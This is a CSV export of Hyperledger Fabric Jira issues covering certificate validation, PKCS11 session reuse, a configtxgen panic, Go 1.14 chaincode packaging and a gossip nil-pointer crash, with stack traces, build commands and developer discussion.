Check that validation of the MSP certificates/CRLs is sufficient,FAB-17720,44750,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dereckluo,wlahti,wlahti,08/Apr/20 6:42 AM,23/Apr/20 7:12 AM,28/Oct/23 3:09 AM,23/Apr/20 7:12 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"One thing I know we're missing is checking that intermediate certs are signed by one of the root certs. 

----------------------
April 14 update: looked into the msp code to see how it's handling cert validation. We already knew it doesn't care about expiration of certificates but hadn't fully investigated the actual implementation. It's using [these options|https://github.com/hyperledger/fabric/blob/master/msp/mspimplvalidate.go#L273-L287]  and then calling cert.Verify() to [check for a unique validation chain|https://github.com/hyperledger/fabric/blob/master/msp/mspimpl.go#L720-L738]. We should try to incorporate these details into the library instead of our very basic CheckSignatureFrom check. ",,dereckluo,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzk",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),dereckluo,wlahti,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"15/Apr/20 1:47 AM;dereckluo;https://github.com/hyperledger/fabric/pull/1085;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
replace Metadata in query API with Limit and Bookmark,FAB-17721,44753,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,08/Apr/20 10:08 PM,18/Apr/20 2:42 PM,28/Oct/23 3:09 AM,18/Apr/20 2:42 PM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01aqj:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PKCS11 client in Fabric's BCCSP can re-use bad sessions,FAB-17722,44754,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mrshah-ibm,mrshah-ibm,mrshah-ibm,08/Apr/20 10:09 PM,29/Sep/20 9:23 AM,28/Oct/23 3:09 AM,14/May/20 4:54 PM,v1.4.6,,,,,,,,,v1.4.7,v2.2.0,,,fabric-crypto,,,,,,,,,0,operator,,,,,"Currently the pkcs11 code in fabric's bccsp module is set to have a session cache and reuse sessions if available in cache. If a session goes bad (due to connection issues with HSM), the session is not evicted from cache and will be reused. If all sessions go bad, the client will never be able to recover and keep using bad sessions.",,denyeart,mrshah-ibm,rhegde,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-18242,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01aqr:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,mrshah-ibm,rhegde,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.2,release-1.4,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"14/May/20 4:54 PM;denyeart;[https://github.com/hyperledger/fabric/pull/1047] master

[https://github.com/hyperledger/fabric/pull/1022] release-1.4

 ;;;","23/Jul/20 9:50 AM;rhegde;Hello [~mrshah-ibm]r,

We are currently seeing a slow PKCS11 HSM signing process on v1.4.2 release. This is one of the Jira that was referenced by [~denyeart].

I was trying to check if there would be any error or a indication of use of stale HSM session in the Peer or Orderer log such that it would confirm the need of v1.4.7 upgrade?

Do you think, this could be one of the reason of slow HSM signing, here is RC conversation + log  [https://chat.hyperledger.org/channel/fabric-peer-endorser-committer?msg=C7Kd9yDrvnFYZzGtK] .

Thanks.;;;","26/Sep/20 9:48 AM;denyeart;GetSessionInfo() call removed in FAB-18242 to improve performance.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
rm statedb package import in stateleveldb/statecouchdb,FAB-17723,44755,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,Senthil1,Senthil1,Senthil1,09/Apr/20 2:41 AM,10/Apr/20 1:48 AM,28/Oct/23 3:09 AM,10/Apr/20 1:48 AM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01aqz:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
configtxgen cannot find etcdraft default config,FAB-17724,44756,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,dereckluo,lehors,lehors,09/Apr/20 4:51 AM,14/Apr/20 3:44 AM,28/Oct/23 3:09 AM,14/Apr/20 3:31 AM,v2.1.0,,,,,,,,,v2.0.2,v2.1.0,v2.2.0,,fabric-tools,,,,,,,,,0,ipm,,,,," 
{code:java}
$ ../bin-master/configtxgen -configPath . -profile SampleMultiNodeEtcdRaft -channelID byfn-sys-channel -outputBlock ./channel-artifacts/genesis.block
2020-04-08 21:42:38.407 CEST [common.tools.configtxgen] main -> INFO 001 Loading configuration
2020-04-08 21:42:38.437 CEST [common.tools.configtxgen.localconfig] completeInitialization -> INFO 002 Orderer.Addresses unset, setting to [127.0.0.1:7050]
2020-04-08 21:42:38.437 CEST [common.tools.configtxgen.localconfig] completeInitialization -> INFO 003 orderer type: etcdraft
2020-04-08 21:42:38.437 CEST [common.tools.configtxgen.localconfig] completeInitialization -> PANI 004 etcdraft configuration missing
2020-04-08 21:42:38.437 CEST [common.tools.configtxgen] func1 -> PANI 005 etcdraft configuration missing
panic: etcdraft configuration missing [recovered]
	panic: etcdraft configuration missinggoroutine 1 [running]:
github.com/hyperledger/fabric/vendor/go.uber.org/zap/zapcore.(*CheckedEntry).Write(0xc0000dfce0, 0x0, 0x0, 0x0)
	/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/vendor/go.uber.org/zap/zapcore/entry.go:230 +0x546
github.com/hyperledger/fabric/vendor/go.uber.org/zap.(*SugaredLogger).log(0xc0000ce2f8, 0x4, 0xc0000f2c40, 0x1e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0)
	/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/vendor/go.uber.org/zap/sugar.go:234 +0x100
github.com/hyperledger/fabric/vendor/go.uber.org/zap.(*SugaredLogger).Panicf(...)
	/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/vendor/go.uber.org/zap/sugar.go:159
github.com/hyperledger/fabric/common/flogging.(*FabricLogger).Panic(0xc0000ce300, 0xc0002e95f0, 0x1, 0x1)
	/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/common/flogging/zap.go:73 +0x99
main.main.func1()
	/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/cmd/configtxgen/main.go:253 +0x176
panic(0x46d6500, 0xc0003c4100)
	/usr/local/go/src/runtime/panic.go:679 +0x1b2
github.com/hyperledger/fabric/vendor/go.uber.org/zap/zapcore.(*CheckedEntry).Write(0xc0000dfce0, 0x0, 0x0, 0x0)
	/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/vendor/go.uber.org/zap/zapcore/entry.go:230 +0x546
github.com/hyperledger/fabric/vendor/go.uber.org/zap.(*SugaredLogger).log(0xc0000ce2d8, 0x4, 0x47fba91, 0x18, 0xc0002e9a90, 0x1, 0x1, 0x0, 0x0, 0x0)
	/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/vendor/go.uber.org/zap/sugar.go:234 +0x100
github.com/hyperledger/fabric/vendor/go.uber.org/zap.(*SugaredLogger).Panicf(...)
	/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/vendor/go.uber.org/zap/sugar.go:159
github.com/hyperledger/fabric/common/flogging.(*FabricLogger).Panicf(...)
	/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/common/flogging/zap.go:74
github.com/hyperledger/fabric/internal/configtxgen/genesisconfig.(*Orderer).completeInitialization(0xc000032750, 0xc0000407e0, 0x51)
	/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/internal/configtxgen/genesisconfig/config.go:373 +0xe86
github.com/hyperledger/fabric/internal/configtxgen/genesisconfig.(*TopLevel).completeInitialization(0xc0000d7770, 0xc0000407e0, 0x51)
	/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/internal/configtxgen/genesisconfig/config.go:279 +0xaf
github.com/hyperledger/fabric/internal/configtxgen/genesisconfig.(*configCache).load(0x4dbbf40, 0xc0002e9cf8, 0xc0000407e0, 0x5f, 0x0, 0x0, 0x0)
	/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/internal/configtxgen/genesisconfig/config.go:486 +0x1b6
github.com/hyperledger/fabric/internal/configtxgen/genesisconfig.Load(0x7ffeefbffa51, 0x17, 0xc000213f30, 0x1, 0x1, 0x0)
	/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/internal/configtxgen/genesisconfig/config.go:256 +0x313
main.main()
	/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/cmd/configtxgen/main.go:266 +0x848

{code}
This works fine with the 2.0.1 version:
{code:java}
$ ../bin-2.0.1/configtxgen -configPath . -profile SampleMultiNodeEtcdRaft -channelID byfn-sys-channel -outputBlock ./channel-artifacts/genesis.block
2020-04-08 21:25:33.115 CEST [common.tools.configtxgen] main -> INFO 001 Loading configuration
2020-04-08 21:25:33.140 CEST [common.tools.configtxgen.localconfig] completeInitialization -> INFO 002 orderer type: etcdraft
2020-04-08 21:25:33.140 CEST [common.tools.configtxgen.localconfig] completeInitialization -> INFO 003 Orderer.EtcdRaft.Options unset, setting to tick_interval:""500ms"" election_tick:10 heartbeat_tick:1 max_inflight_blocks:5 snapshot_interval_size:16777216 
2020-04-08 21:25:33.140 CEST [common.tools.configtxgen.localconfig] Load -> INFO 004 Loaded configuration: /Users/lehors/Projects/Go/src/github.com/hyperledger/fabric-samples/first-network/configtx.yaml
2020-04-08 21:25:33.144 CEST [common.tools.configtxgen] doOutputBlock -> INFO 005 Generating genesis block
2020-04-08 21:25:33.144 CEST [common.tools.configtxgen] doOutputBlock -> INFO 006 Writing genesis block

{code}
I did find one workaround: specify the EtcdRaft Consenters directly in the Profile definition in configtx.yaml rather than through &OrdererDefaults

 

 ",,denyeart,dereckluo,lehors,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzzzjy9",,,,Unset,Unset,,"cd fabric-samples/first-network
./byfn.sh generate",,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,dereckluo,lehors,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-2.1,main,release-2.0,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"09/Apr/20 5:58 AM;denyeart;I see the same thing.
[~dereckluo] It looks like it broke as of this PR:
https://github.com/hyperledger/fabric/pull/758

;;;","13/Apr/20 10:29 AM;dereckluo;https://github.com/hyperledger/fabric/pull/1071;;;","14/Apr/20 3:44 AM;denyeart;Merged in all three branches... luckily this was caught before any release included it.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Install of a Go 1.14 chaincode fails,FAB-17725,44757,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,sykesm,lehors,lehors,09/Apr/20 5:08 AM,03/Aug/20 11:39 PM,28/Oct/23 3:09 AM,11/Apr/20 2:01 AM,v2.0.1,,,,,,,,,v2.1.0,v2.2.0,,,fabric-peer,,,,,,,,,0,,,,,,"Chaincode install of a chaincode with go.mod set to 1.14 leads to the following error:
{code:java}
Error: chaincode install failed with status: 500 - failed to invoke backing implementation of 'InstallChaincode': could not build chaincode: docker build failed: docker image build failed: docker build failed: Error returned from build: 1 ""go: inconsistent vendoring in /chaincode/input/src/github.com/hyperledger/fabric-samples/chaincode/abstore/go:
	github.com/hyperledger/fabric-contract-api-go@v1.0.0: is explicitly required in go.mod, but not marked as explicit in vendor/modules.txt

run 'go mod vendor' to sync, or use -mod=mod or -mod=readonly to ignore the vendor directory
{code}
{{}}
This is because we don't package vendor/modules.txt within the chaincode tar file when it is needed for the build to succeed in Go 1.14 as described here: [golang/go#37948|https://github.com/golang/go/issues/37948]

We can avoid the problem by sticking to the go 1.13 spec in go.mod for now but that's not a long term solution.",,denyeart,lehors,sykesm,,,,,,,,,,,,,,,,,,,FAB-18110,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17924,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01arf:",,,,Unset,Unset,,"cd fabric-samples/chaincode/abstore/go
sed s/1.13/1.14/ go.mod > go.mod
cd ../../../first-network
./byfn.sh up",,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,lehors,sykesm,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-2.1,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"09/Apr/20 7:36 AM;sykesm;So I'm not a samples guy because the scripts hide the meaningful steps. There isn't a single package or install command listed in your steps to reproduce and the commands are spread across scripts and containers.

That said, the output from the build implies that the modules.txt is actually included in the package. The build is highlighting that something is missing from the file - not that the file is missing.

Additionally, when I locally vendor code with {{go mod vendor}} and package the chaincode with {{peer lifecycle chaincode package}}, the resulting package does include the vendor/modules.txt file.

{code}
dev-box   master → origin {2} U:2 ?:3  ~/workspace/fabric/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/testdata/ccmodule 
$ go version
go version go1.14.1 linux/amd64
$ go mod vendor
$ head -10 vendor/modules.txt 
# github.com/golang/protobuf v1.3.2
github.com/golang/protobuf/proto
github.com/golang/protobuf/ptypes
github.com/golang/protobuf/ptypes/any
github.com/golang/protobuf/ptypes/duration
github.com/golang/protobuf/ptypes/timestamp
# github.com/hyperledger/fabric-chaincode-go v0.0.0-20190823162523-04390e015b85
## explicit
github.com/hyperledger/fabric-chaincode-go/shim
github.com/hyperledger/fabric-chaincode-go/shim/internal
$ head go.mod
module ccmodule

go 1.14

require (
        github.com/hyperledger/fabric-chaincode-go v0.0.0-20190823162523-04390e015b85
        github.com/hyperledger/fabric-protos-go v0.0.0-20190823190507-26c33c998676
)
$ cd ..
$ FABRIC_CFG_PATH=~/workspace/fabric/src/github.com/hyperledger/fabric/sampleconfig ~/workspace/fabric/src/github.com/hyperledger/fabric/build/bin/peer lifecycle chaincode package -p ccmodule --label ccmodule ccmodule.tgz
$ tar zxvOf ccmodule.tgz code.tar.gz | tar zxO src/vendor/modules.txt | head -10
code.tar.gz
# github.com/golang/protobuf v1.3.2
github.com/golang/protobuf/proto
github.com/golang/protobuf/ptypes
github.com/golang/protobuf/ptypes/any
github.com/golang/protobuf/ptypes/duration
github.com/golang/protobuf/ptypes/timestamp
# github.com/hyperledger/fabric-chaincode-go v0.0.0-20190823162523-04390e015b85
## explicit
github.com/hyperledger/fabric-chaincode-go/shim
github.com/hyperledger/fabric-chaincode-go/shim/internal
$ tar zxvOf ccmodule.tgz code.tar.gz | tar zxO src/go.mod | head
code.tar.gz
module ccmodule

go 1.14

require (
        github.com/hyperledger/fabric-chaincode-go v0.0.0-20190823162523-04390e015b85
        github.com/hyperledger/fabric-protos-go v0.0.0-20190823190507-26c33c998676
)
$ 
{code}

Perhaps you can take another look at what's going on in your environment to see what's going on? The only way I can reproduce it is to modify {{go.mod}} to go 1.14 and build **without** running {{go mod vendor}}. In that case, what go is complaining about is completely appropriate since the vendor tree does not match go.mod.

{code}
dev-box   master  ~/workspace/fabric/src/github.com/hyperledger/fabric-samples/chaincode/abstore/go 
$ ls
abstore.go  go.mod  go.sum
$ cat go.mod 
module github.com/hyperledger/fabric-samples/chaincode/abstore/go

go 1.13

require github.com/hyperledger/fabric-contract-api-go v1.0.0
$ go mod vendor
$ GO111MODULE=on go build -mod=vendor -o /tmp/chaincode
$ rm -rf vendor
$ sed -i s/1.13/1.14/ go.mod
$ cat go.mod
module github.com/hyperledger/fabric-samples/chaincode/abstore/go

go 1.14

require github.com/hyperledger/fabric-contract-api-go v1.0.0
$ GO111MODULE=on go build -mod=vendor -o /tmp/chaincode
go: inconsistent vendoring in /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric-samples/chaincode/abstore/go:
        github.com/hyperledger/fabric-contract-api-go@v1.0.0: is explicitly required in go.mod, but not marked as explicit in vendor/modules.txt

run 'go mod vendor' to sync, or use -mod=mod or -mod=readonly to ignore the vendor directory
 1 $ go mod vendor
$ GO111MODULE=on go build -mod=vendor -o /tmp/chaincode
$ 
{code};;;","09/Apr/20 3:37 PM;lehors;Ok, I dug up a bit more and found the source of the problem.

It turns out that the problem is triggered by the fact that BYFN specifies the chaincode as a github go path rather than a local path.

The chaincode package is created with:
{code:java}
$ FABRIC_CFG_PATH=~/Projects/Go/src/github.com/hyperledger/fabric-samples/config peer lifecycle chaincode package mycc.tar.gz --path github.com/hyperledger/fabric-samples/chaincode/abstore/go/ --lang golang --label mycc_1
{code}
That tar file does not contain vendor/modules.txt:
{code:java}
$ tar zxvOf mycc.tar.gz code.tar.gz | tar zxO src/vendor/modules.txt
x code.tar.gz
tar: src/vendor/modules.txt: Not found in archive
tar: Error exit delayed from previous errors.
{code}
For what it's worth, BYFN does run go mod vendor prior to this but it's useless because it does that locally and that's not what's being used by the package command.

Changing the specification of the chaincode path to a local path works:
{code:java}
$ FABRIC_CFG_PATH=~/Projects/Go/src/github.com/hyperledger/fabric-samples/config ~/Projects/Go/src/github.com/hyperledger/fabric/build/bin/peer lifecycle chaincode package -p $GOPATH/src/github.com/hyperledger/fabric-samples/chaincode/abstore/go --label mycc mycc.tar.gz
~/Projects/Go/src/github.com/hyperledger/fabric-samples/first-network
$ tar zxvOf mycc.tar.gz code.tar.gz | tar zxO src/vendor/modules.txt|head -10
x code.tar.gz
# github.com/PuerkitoBio/purell v1.1.1
github.com/PuerkitoBio/purell
# github.com/PuerkitoBio/urlesc v0.0.0-20170810143723-de5bf2ad4578
github.com/PuerkitoBio/urlesc
# github.com/go-openapi/jsonpointer v0.19.3
github.com/go-openapi/jsonpointer
# github.com/go-openapi/jsonreference v0.19.2
github.com/go-openapi/jsonreference
# github.com/go-openapi/spec v0.19.{code};;;","09/Apr/20 6:57 PM;sykesm;> package -p $GOPATH/src/github.com/hyperledger/fabric-samples/chaincode/abstore/go

Looks like you have a GOPATH set which can influence the mode of the go tooling.

> BYFN does run go mod vendor prior to this but it's useless because it does that locally and that's not what's being used by the package command.

I don't understand this. {{go mod vendor}} creates a vendor folder at the top level of the module. The package command in module mode, grabs everything under the module root (which includes the vendor tree); in legacy/GOPATH mode, it lists all dependencies of the package and captures them into the package. If the vendored packages were used by the package, they would be included from their source.;;;","09/Apr/20 8:39 PM;lehors;There is nothing special about my GOPATH:
{code:java}
$ echo $GOPATH
/Users/lehors/Projects/Go
{code}
Where is the chaincode taken from when its path is specified as ""github.com/hyperledger/fabric-samples/chaincode/abstore/go/""?

It's not a path relative to the working dir so I don't actually know where it's taken from. I thought it could be relative to the $GOPATH but it doesn't look like it either since when I expand it myself as above it works.

For that matter the following fails and I'm also not sure where the code is taken from in that case:
{code:java}
$ FABRIC_CFG_PATH=~/Projects/Go/src/github.com/hyperledger/fabric/sampleconfig ~/Projects/Go/src/github.com/hyperledger/fabric/build/bin/peer lifecycle chaincode package -p github.com/hyperledger/fabric/core/chaincode/platforms/golang/testdata/ccmodule --label mycc mycc.tgz
Error: error getting chaincode bytes: failed to calculate dependencies: incomplete package: ccmodule/customlogger
{code}
Making the path relative to the current dir or absolute works.;;;","09/Apr/20 9:23 PM;sykesm;> There is nothing special about my GOPATH

1. You have a GOPATH
2. You are not explicitly putting yourself into module mode (GO111MODULE=on) during packaging
3. You are using an *import path* instead of a *path* to reference the code to package
4. The *import path* is resolvable from GOPATH

So, given the current rules of modules in go, you're running in legacy GOPATH mode during packaging but the build believes it should be executing in module mode because go.mod is present. In GOPATH mode, the vendor tree is honored. In module mode, the vendor tree is honored with -mod=vendor is used (for go 1.11+) or, new with go 1.14, when present.

At the end of the day, if you're trying to package a *module*, you should be in module mode instead of legacy/GOPATH mode.

I'm going to create a PR that explicitly omits go.mod and go.sum when we're not packaging in module mode but it's hard to say if that's more or less surprising than anything else in this space. IMO, the whole magical packaging process makes things way more complicated than it needs to be.;;;","09/Apr/20 9:50 PM;lehors;I'm glad somebody understands what's going on here. :)

I think it's rather unnatural that it behaves differently whether it is an import path or a path when they both resolve to the exact same path.

And why is it that forcing GO111MODULE=on fails?
{code:java}
$ GO111MODULE=on FABRIC_CFG_PATH=~/Projects/Go/src/github.com/hyperledger/fabric-samples/config ~/Projects/Go/src/github.com/hyperledger/fabric/build/bin/peer lifecycle chaincode package -p github.com/hyperledger/fabric-samples/chaincode/abstore/go --label mycc mycc.tar.gz
Error: error getting chaincode bytes: exit status 1
{code}
Thanks for helping figuring this out.;;;","09/Apr/20 10:17 PM;lehors;Ok, I think I get it. When in module mode the path is no longer interpreted as an import path but merely a path, which fails. Pfew.

I just tried and removing go.mod and go.sum does avoid the problem in this case indeed. This should help.

Thanks.

 

 ;;;","09/Apr/20 10:43 PM;sykesm;> And why is it that forcing GO111MODULE=on fails?

Because {{-p}} isn't pointing to a directory, it's pointing to an import path. It case it isn't clear yet, {{path != importPath}}.

{code}
$ GO111MODULE=on go list -f '{{.Dir}}' github.com/hyperledger/fabric-samples/abstore/go
can't load package: cannot find module providing package github.com/hyperledger/fabric-samples/abstore/go: working directory is not part of a module
{code}

The only time they're roughly equivalent is when you're in $GOPATH/src.;;;","09/Apr/20 11:50 PM;sykesm;[https://github.com/hyperledger/fabric/pull/1043]

[https://github.com/hyperledger/fabric/pull/1045]

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Properly handle malformed gossip envelopes,FAB-17726,44763,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,09/Apr/20 9:27 PM,11/Apr/20 2:12 AM,28/Oct/23 3:09 AM,10/Apr/20 8:40 PM,v1.4.6,v2.0.0,v2.1.0,,,,,,,v1.4.7,v2.0.2,v2.1.0,v2.2.0,fabric-gossip,,,,,,,,,0,,,,,,"If a malformed envelope is read from the stream, an error is propagated
synchronously up the stack.

However, the envelope is unmarshaled into a nil
message which is also propagated further up the stack asynchronously.

Under very rare circumstances, the error is picked up later than
the message, and a nil pointer panic occurs.

{code}

2020-04-07 21:50:09.184 UTC [gossip.comm] readFromStream -> WARN 47bb149 Got error, aborting: Failed unmarshaling GossipMessage from envelope: unexpected EOF
panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x1 addr=0x8 pc=0xc6ab8e]
goroutine 76685136 [running]:
github.com/hyperledger/fabric/gossip/comm.interceptAcks.func1(0x0)
      /opt/gopath/src/github.com/hyperledger/fabric/gossip/comm/ack.go:66 +0x2e
github.com/hyperledger/fabric/gossip/comm.(*connection).serviceConnection(0xc0018cbb80, 0x126d5a0, 0xc001b27440)
      /opt/gopath/src/github.com/hyperledger/fabric/gossip/comm/conn.go:299 +0x135
github.com/hyperledger/fabric/gossip/comm.(*commImpl).GossipStream(0xc001b27440, 0x13856c0, 0xc00fac6640, 0x0, 0x0)
      /opt/gopath/src/github.com/hyperledger/fabric/gossip/comm/comm_impl.go:599 +0x3c3
github.com/hyperledger/fabric/protos/gossip._Gossip_GossipStream_Handler(0x11ba000, 0xc001b27440, 0x1383aa0, 0xc002888c00, 0x40d1d8, 0x30)
      /opt/gopath/src/github.com/hyperledger/fabric/protos/gossip/message.pb.go:2758 +0xad
github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware.ChainStreamServer.func1.1(0x11ba000, 0xc001b27440, 0x1383aa0, 0xc002888c00, 0x1b, 0x13806fe)
      /opt/gopath/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:71 +0xf5
github.com/hyperledger/fabric/common/grpclogging.StreamServerInterceptor.func1(0x11ba000, 0xc001b27440, 0x1383b00, 0xc002888780, 0xc011ca82e0, 0xc00afe5d10, 0x5e8cd8b4, 0x29cab6cd)
      /opt/gopath/src/github.com/hyperledger/fabric/common/grpclogging/server.go:128 +0x2b3
github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware.ChainStreamServer.func1.1(0x11ba000, 0xc001b27440, 0x1383b00, 0xc002888780, 0x136b2e0, 0x1f51e20)
      /opt/gopath/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:74 +0x9c
github.com/hyperledger/fabric/common/grpcmetrics.StreamServerInterceptor.func1(0x11ba000, 0xc001b27440, 0x1383f20, 0xc0018cb550, 0xc011ca82e0, 0xc00afe5d10, 0xc0061f8c48, 0x40d1d8)
      /opt/gopath/src/github.com/hyperledger/fabric/common/grpcmetrics/interceptor.go:63 +0x408
github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware.ChainStreamServer.func1(0x11ba000, 0xc001b27440, 0x1383f20, 0xc0018cb550, 0xc011ca82e0, 0x126d968, 0x13809e0, 0xc0002d2640)
      /opt/gopath/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:79 +0x14d
github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).processStreamingRPC(0xc001b82180, 0x1387520, 0xc006495980, 0xc004174400, 0xc001924420, 0x1e358c0, 0xc002888630, 0x0, 0x0)
      /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:1131 +0x440
github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).handleStream(0xc001b82180, 0x1387520, 0xc006495980, 0xc004174400, 0xc002888630)
      /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:1212 +0x12a1
github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).serveStreams.func1.1(0xc000be83d0, 0xc001b82180, 0x1387520, 0xc006495980, 0xc004174400)
      /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:686 +0x9f
created by github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).serveStreams.func1
      /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:684 +0xa1
{code}",,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01asj:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"09/Apr/20 9:30 PM;yacovm;[https://github.com/hyperledger/fabric/pull/1036]

[https://github.com/hyperledger/fabric/pull/1037]

[https://github.com/hyperledger/fabric/pull/1038]

https://github.com/hyperledger/fabric/pull/1039;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
